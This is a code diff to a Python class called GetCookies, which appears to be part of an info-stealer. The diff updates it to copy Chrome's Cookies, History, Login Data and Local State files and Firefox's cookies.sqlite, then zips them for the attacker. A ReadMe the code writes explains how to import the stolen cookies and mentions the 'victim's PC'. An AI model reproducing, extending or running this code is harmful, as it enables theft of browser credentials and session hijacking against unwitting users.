@@ -14,26 +14,35 @@ class GetCookies:
             pass
         os.system("md Cookies Cookies\\Chrome Cookies\\Firefox")
 
-        chrome_cookiepath = os.environ.get('HOMEDRIVE') + os.environ.get('HOMEPATH') + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default'
+        chrome_cookiepath1 = os.environ.get('HOMEDRIVE') + os.environ.get('HOMEPATH') + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network'
+        chrome_cookiepath2 = os.environ.get('HOMEDRIVE') + os.environ.get('HOMEPATH') + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default'
+        chrome_cookiepath3 = os.environ.get('HOMEDRIVE') + os.environ.get('HOMEPATH') + '\\AppData\\Local\\Google\\Chrome\\User Data'
         chrome_destinationPath = tempdir + "\\Cookies\\Chrome"
         
-        firefox_cookiepath = os.environ.get('HOMEDRIVE') + os.environ.get('HOMEPATH') + '\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\q1dyz51w.default\\cookies.sqlite'
+        firefox_cookiedir = os.environ.get('HOMEDRIVE') + os.environ.get('HOMEPATH') + '\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles' 
+        for path in os.listdir(firefox_cookiedir):
+            if os.path.exists(firefox_cookiedir+"\\"+path+"\\cookies.sqlite"):
+                firefox_cookiepath = firefox_cookiedir+"\\"+path+"\\cookies.sqlite"
+                break
         firefox_destinationPath = tempdir + "\\Cookies\\Firefox"
 
-        cookie = chrome_cookiepath + "\\Cookies"
-        history = chrome_cookiepath + "\\History"
-        loginData = chrome_cookiepath + "\\Login Data"
+        cookie = chrome_cookiepath1 + "\\Cookies"
 
-        if os.path.exists(chrome_cookiepath):
+        history     = chrome_cookiepath2 + "\\History"
+        loginData   = chrome_cookiepath2 + "\\Login Data"
+        login_state = chrome_cookiepath3 + "\\Local State"
+
+        if os.path.exists(chrome_cookiepath1):
             shutil.copy2(cookie, chrome_destinationPath)
             shutil.copy2(history, chrome_destinationPath)
             shutil.copy2(loginData, chrome_destinationPath)
+            shutil.copy2(login_state, chrome_destinationPath)
             
-        if os.path.exists(firefox_cookiepath):
+        if os.path.exists(firefox_cookiedir):
             shutil.copy2(firefox_cookiepath, firefox_destinationPath)   
         
         with open("Cookies/ReadMe.txt" , "w") as f:
-            f.write("In Order To Import These Cookies, Just Copy & Paste Them At This Path: \n\n[For Chrome]\nC:/Users/USERNAME/AppData/Local/Google/Chrome/User Data/Default/\n\n[For Firefox]\nC:/Users/USERNAME/AppData/Roaming/Mozilla/Firefox/Profiles/q1dyz51w.default/\n\n[Note]\nIf Cookies are not found in there respective folders that means that, that particular browser is not installed on victim's PC")
+            f.write("In Order To Import These Cookies, Just Copy & Paste Them At These Path: \n\n[For Chrome]\nC:/Users/USERNAME/AppData/Local/Google/Chrome/User Data/Default/Network/Cookies\nC:/Users/USERNAME/AppData/Local/Google/Chrome/User Data/Default/History\nC:/Users/USERNAME/AppData/Local/Google/Chrome/User Data/Default/Login Data\nC:/Users/USERNAME/AppData/Local/Google/Chrome/User Data/Login State\n\n[For Firefox]\nC:/Users/USERNAME/AppData/Roaming/Mozilla/Firefox/Profiles/XXXXXXX.default/cookies.sqlite\n\n[Note]\nIf Cookies are not found in there respective folders then means that, that particular browser is not installed on victim's PC")
 
         shutil.make_archive("Cookies", "zip", "Cookies")    
         shutil.rmtree("Cookies")
